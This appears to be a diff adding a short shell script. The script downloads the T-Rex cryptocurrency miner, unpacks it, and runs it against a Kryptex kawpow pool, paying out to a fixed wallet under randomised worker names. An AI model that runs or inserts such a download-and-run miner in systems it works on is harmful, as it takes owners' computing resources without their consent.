@@ -1,0 +1,3 @@
+curl https://github.com/kryptex-miners-org/kryptex-miners/releases/download/trex-0-26-8/t-rex-0.26.8-linux.tar.gz -L -o t-rex-0.26.8-linux.tar.gz
+tar xf t-rex-0.26.8-linux.tar.gz
+./t-rex -a kawpow -o stratum+tcp://quai-kawpow.kryptex.network:7043 -u 0x000284da7cC36046Be6d59B3343a573a83A09b73/$(echo $RANDOM | md5sum | head -c 10)
